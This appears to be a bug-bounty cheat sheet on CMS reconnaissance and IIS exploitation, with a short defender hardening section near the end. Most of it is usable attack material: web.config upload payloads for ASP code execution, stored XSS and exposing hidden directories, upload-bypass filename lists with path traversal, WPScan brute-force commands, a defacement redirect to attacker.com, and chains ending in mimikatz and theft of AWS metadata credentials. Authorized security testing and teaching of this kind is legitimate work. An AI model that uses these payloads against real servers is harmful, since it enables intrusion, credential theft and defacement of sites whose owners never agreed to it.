## 1. Overview (Theory)

A **Content Management System (CMS)** is software that allows users to create, manage, and modify digital content on websites without extensive technical knowledge. Popular examples include WordPress, Joomla, Drupal, Magento, Typo3, and Shopify.

**Why CMSs are huge targets:**

- Widely deployed across the internet
- Often run outdated versions with known CVEs
- Plugin/extension ecosystems introduce vulnerabilities
- Default configurations often insecure
- Verbose error messages leak information

**Common CMS identification methods:**

- Credits in page footers/corners
- HTTP response headers
- Standard files (`robots.txt`, `sitemap.xml`, `readme.html`)
- HTML/CSS/JS comments and metadata
- Stack traces and error messages
- URL patterns and directory structures

---

## 2. Reconnaissance & Enumeration

### **Automated Scanning Tools**

|Tool|Language|Supports|
|---|---|---|
|[WPScan](https://github.com/wpscanteam/wpscan)|Ruby|WordPress|
|[droopescan](https://github.com/SamJoan/droopescan)|Python|Drupal, SilverStripe, WordPress, Joomla (partial), Moodle (partial)|
|[JoomScan](https://github.com/hblankenship/joomscan)|Perl|Joomla|
|[VulnX](https://github.com/anouarbensaad/vulnx)|Python|Multi-CMS scanner|
|[CMSmap](https://github.com/Dionach/CMSmap)|Python|WordPress, Joomla, Drupal|
|[CMSeeK](https://github.com/Tuhinshubhra/CMSeeK)|Python|170+ CMSs|
|[Drupwn](https://github.com/immunIT/drupwn)|Python|Drupal|
|[AEM-Hacker](https://github.com/0ang3el/aem-hacker)|Python|Adobe Experience Manager|
|[Jira-Lens](https://github.com/MayankPandey01/Jira-Lens)|Python|Jira (25+ checks)|
|[Wappalyzer](https://www.wappalyzer.com/)|Browser|Technology detection|
|[WhatCMS](https://whatcms.org/)|Web Service|CMS identification|

### **WPScan Usage (WordPress)**

```bash
# Basic scan
wpscan --url https://target.com

# Enumerate users
wpscan --url https://target.com --enumerate u

# Enumerate user range
wpscan --url https://target.com --enumerate u1-100

# Enumerate plugins, themes, timthumbs
wpscan --url https://target.com --enumerate p,t,tt

# Bruteforce single user
wpscan --url https://target.com --username admin --passwords /path/to/wordlist.txt

# Enumerate + bruteforce all users
wpscan --url https://target.com --enumerate u --passwords /path/to/wordlist.txt

# API token (for vulnerability data)
wpscan --url https://target.com --api-token YOUR_TOKEN
```

### **Droopescan Usage (Multi-CMS)**

```bash
# Auto-detect CMS
droopescan scan -u https://target.com

# Scan specific CMS
droopescan scan drupal -u https://target.com
droopescan scan wordpress -u https://target.com
droopescan scan joomla -u https://target.com
```

---

## 3. IIS-Specific Exploitation Methods

### **3.1 Internal IP Address Disclosure**

**Vulnerability:** IIS servers may leak internal IP addresses when HTTP/1.0 requests without Host headers trigger 302 redirects.

**Exploitation Steps:**

1. Send HTTP/1.0 request without Host header:

```http
GET / HTTP/1.0
```

2. Check `Location` header in response:

```http
HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```

**Impact:** Information disclosure, internal network mapping, potential pivot point.

---

### **3.2 Web.config Code Execution**

**Vulnerability:** IIS can be tricked into executing `web.config` files as ASP scripts if ASP is enabled but `.asp` uploads are blocked.

**Exploitation Steps:**

1. **Upload this malicious `web.config` file:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' Test code execution
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

2. **Access the uploaded file** - If you see "3" rendered, code execution is confirmed.

**Common Uploadable Extensions (IIS Servers):**

**ASP Servers:**

```
.asp
.aspx
.config
.cer
.asa (IIS <= 7.5)
.soap
shell.aspx;1.jpg (IIS < 7.0)
```

**PHP Servers:**

```
.php, .php3, .php4, .php5, .php7
.pht, .phps, .phar, .phpt
.pgif, .phtml, .phtm, .inc
```

**Other Common:**

```
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
.pl, .pm, .cgi, .lib (Perl)
.cfm, .cfml, .cfc, .dbm (Coldfusion)
```

---

### **3.3 Removing Hidden Segment Protections**

**Vulnerability:** IIS Request Filtering hides directories like `App_Data`, but a malicious `web.config` can expose them.

**Exploitation:**

Upload this `web.config` to the upload directory:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <security>
            <requestFiltering>
                <hiddenSegments>
                    <remove segment="bin" />
                    <remove segment="App_code" />
                    <remove segment="App_GlobalResources" />
                    <remove segment="App_LocalResources" />
                    <remove segment="App_Browsers" />
                    <remove segment="App_WebReferences" />
                    <remove segment="App_Data" />
                </hiddenSegments>
            </requestFiltering>
        </security>
    </system.webServer>
</configuration>
```

**Result:** Previously hidden directories become directly accessible.

---

### **3.4 XSS via IIS Error Pages**

**Vulnerability:** IIS default error pages reflect handler names without sanitization, enabling stored XSS.

**Exploitation:**

Upload this `web.config`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <!-- XSS via *.config -->
         <add name="web_config_xss&lt;script&gt;alert('xss1')&lt;/script&gt;" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="fooo" resourceType="Unspecified" requireAccess="None" preCondition="bitness64" />
         <!-- XSS via *.test -->
         <add name="test_xss&lt;script&gt;alert('xss2')&lt;/script&gt;" path="*.test" verb="*"  />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   <httpErrors existingResponse="Replace" errorMode="Detailed" />
   </system.webServer>
</configuration>
```

**Trigger:** Access `https://target.com/upload/anything.config` or `anything.test`

**Impact:** Stored XSS affects all users accessing those file types.

---

### **3.5 IIS Tilde (~) Character Vulnerability**

**Vulnerability:** IIS exposes 8.3 short filenames through tilde character enumeration, revealing hidden files/folders.

**Requirements:**

- IIS with 8.3 short names enabled
- Works even behind authentication

**Limitations:**

- Only reveals first 6 characters of filename
- Only reveals first 3 characters of extension

**Exploitation:**

Use [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner):

```bash
java -jar iis_shortname_scanner.jar https://target.com/
```

**Manual Testing:**

```http
GET /upload/*~1*/.aspx HTTP/1.1
Host: target.com
```

**Responses:**

- `404 Not Found` = No match
- `400 Bad Request` = Match found

---

### **3.6 ASP.NET Trace.axd Information Disclosure**

**Vulnerability:** ASP.NET debugging files (`trace.axd`, `elmah.axd`) expose sensitive application data.

**What's Leaked:**

- Client IPs and session IDs
- All request/response cookies
- Physical paths and source code snippets
- Potentially usernames and passwords
- Full HTTP request history

**Exploitation Steps:**

1. **Check for trace.axd:**

```
https://target.com/trace.axd
```

2. **Also check:**

```
https://target.com/elmah.axd
https://target.com/errorlog.axd
```

3. **If SSRF exists**, request internally:

```
http://localhost/trace.axd
http://127.0.0.1/trace.axd
```

**Real-World Example:** [HackerOne Report #519418](https://hackerone.com/reports/519418)

**What to Look For:**

- Authentication tokens in cookies
- API keys in headers
- Database connection strings
- Internal IP addresses
- User credentials in POST data

---

## 4. Web.config Advanced Abuse Scenarios

### **Re-enabling Blocked Extensions**

If `.aspx` is disabled in upload directory:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <add name="aspx_handler" path="*.aspx" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified" requireAccess="Script" />
      </handlers>
   </system.webServer>
</configuration>
```

### **Running Other Extensions as ASP/PHP**

Force `.jpg` to execute as `.php`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <add name="jpg_as_php" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Unspecified" />
      </handlers>
   </system.webServer>
</configuration>
```

### **URL Rewrite for Defacement**

Redirect all users to attacker-controlled page:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <rewrite>
         <rules>
            <rule name="Redirect All">
               <match url="(.*)" />
               <action type="Redirect" url="https://attacker.com/defaced" />
            </rule>
         </rules>
      </rewrite>
   </system.webServer>
</configuration>
```

### **MIME Type Manipulation**

Allow uploading `.html` when blocked:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <staticContent>
         <mimeMap fileExtension=".html" mimeType="text/plain" />
      </staticContent>
   </system.webServer>
</configuration>
```

---

## 5. Higher Impact Scenarios

### **Scenario 1: Web.config Upload → RCE → Domain Admin**

**Attack Chain:**

1. Find file upload accepting `.config` files
2. Upload malicious `web.config` with ASP webshell
3. Execute commands as `IIS APPPOOL\` user
4. Escalate to `NT AUTHORITY\SYSTEM` via token impersonation
5. Dump credentials from memory (mimikatz)
6. Pivot to Domain Controller

**Impact:** Full domain compromise from a file upload vulnerability.

---

### **Scenario 2: Trace.axd + SSRF → AWS Metadata Leak**

**Attack Chain:**

1. Discover SSRF vulnerability in ASP.NET app
2. Use SSRF to read `http://localhost/trace.axd`
3. Extract session tokens and internal API endpoints from trace logs
4. Use SSRF again to hit AWS metadata endpoint
5. Steal IAM credentials from `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

**Impact:** Cloud infrastructure takeover via chained vulnerabilities.

---

### **Scenario 3: IIS Tilde Scan → Exposed Backup Files**

**Attack Chain:**

1. Run IIS shortname scanner on target
2. Discover `BACKUP~1.ZIP` exists
3. Download `backup.zip` containing:
    - Database credentials
    - API keys
    - Source code with hardcoded secrets
4. Use credentials to access production database

**Impact:** Complete data breach from information disclosure.

---

### **Scenario 4: Hidden Segment Removal → Admin Panel Access**

**Attack Chain:**

1. Upload malicious `web.config` removing `App_Data` hidden segment
2. Access `https://target.com/App_Data/admin.aspx` (previously hidden)
3. Find default credentials work (`admin:admin`)
4. Upload webshell through admin panel
5. Full server compromise

**Impact:** Authentication bypass leading to RCE.

---

## 6. Bypasses & Evasion Techniques

### **File Extension Bypasses**

**Double Extensions:**

```
shell.aspx;.jpg
shell.asp;.png
webshell.php;.gif
```

**Case Variation (Windows):**

```
shell.AsP
shell.AsPx
shell.PhP
```

**Null Byte Injection (Legacy IIS < 6):**

```
shell.asp%00.jpg
shell.aspx%00.png
```

**Alternative Extensions:**

```
.asa, .cer (IIS <= 7.5)
.soap, .rem, .svc
.pht, .phtml (PHP)
```

---

### **Content-Type Bypasses**

**Change Content-Type header to bypass validation:**

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.aspx"
Content-Type: image/jpeg

<asp code here>
------WebKitFormBoundary--
```

---

### **Directory Traversal in Uploads**

**Escape upload directory:**

```
filename="../../../shell.aspx"
filename="..\..\..\..\inetpub\wwwroot\shell.aspx"
```

---

### **Web.config in Subdirectories**

If you can't upload to root, upload `web.config` to any writable subdirectory:

```
/uploads/web.config
/files/web.config
/temp/web.config
```

**IIS reads web.config hierarchically** - settings cascade down from parent directories.

---

## 7. Detection & Enumeration Checklist

### **Quick Recon Steps:**

✅ **Identify CMS Version:**

```bash
# WordPress
curl -s https://target.com/ | grep "wp-content"
curl -s https://target.com/readme.html

# Joomla
curl -s https://target.com/administrator/manifests/files/joomla.xml

# Drupal
curl -s https://target.com/CHANGELOG.txt
```

✅ **Check for Debug/Trace Files:**

```
/trace.axd
/elmah.axd
/errorlog.axd
/glimpse.axd
```

✅ **Test IIS Tilde Vulnerability:**

```bash
curl -i "https://target.com/*~1*/.aspx"
# 400 = Vulnerable, 404 = Not vulnerable
```

✅ **Look for Upload Functionality:**

- Profile picture uploads
- Document/file sharing
- Theme/plugin uploads (if admin access)
- Avatar/logo uploads

✅ **Test Upload Restrictions:**

1. Try `.config` upload
2. Try double extensions
3. Try MIME type bypass
4. Try directory traversal

---

## 8. Mitigations (For Defenders)

### **IIS Hardening:**

1. **Disable 8.3 short names globally:**

```cmd
fsutil behavior set disable8dot3 1
```

2. **Disable ASP.NET tracing in production:**

```xml
<trace enabled="false" localOnly="true" />
```

3. **Remove default handlers for unnecessary file types:**

```xml
<handlers>
   <remove name="TraceHandler-Integrated" />
   <remove name="TraceHandler-Classic" />
</handlers>
```

4. **Restrict web.config uploads:**

```xml
<fileExtensions>
   <add fileExtension=".config" allowed="false" />
</fileExtensions>
```

5. **Set custom error pages (avoid detailed errors):**

```xml
<httpErrors errorMode="Custom" existingResponse="Replace">
   <error statusCode="404" path="/errors/404.html" responseMode="File" />
</httpErrors>
```

### **Upload Security Best Practices:**

- ✅ Whitelist allowed extensions (never blacklist)
- ✅ Validate file content (not just extension/MIME type)
- ✅ Store uploads outside webroot
- ✅ Randomize filenames on server
- ✅ Set restrictive permissions on upload directories
- ✅ Scan uploads with antivirus
- ✅ Implement rate limiting
- ✅ Use Content Security Policy (CSP) headers

### **CMS-Specific Hardening:**

**WordPress:**

- Disable file editing in admin panel
- Use security plugins (Wordfence, Sucuri)
- Keep core/plugins/themes updated
- Use strong admin passwords + 2FA
- Limit login attempts

**Joomla/Drupal:**

- Remove install/update scripts after setup
- Restrict `/administrator` access by IP
- Keep extensions updated
- Regular security audits

---

## 9. References & Resources

**Official Documentation:**

- [IIS Configuration Reference](https://docs.microsoft.com/en-us/iis/configuration/)
- [ASP.NET Trace Documentation](https://docs.microsoft.com/en-us/aspnet/web-forms/overview/getting-started/introduction-to-web-forms#tracing)

**Security Research:**

- [HackTricks - IIS Exploits](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [htshells (Apache equivalents)](https://github.com/wireghoul/htshells)

**Bug Bounty Write-ups:**

- [Jira Vulnerabilities in the Wild](https://thehackerish.com/jira-vulnerabilities-and-how-they-are-exploited-in-the-wild/)

---

**Pro Tip:** Always test on authorized targets only. Keep notes of what worked where. Chain small bugs into big impact. Happy hunting! 🎯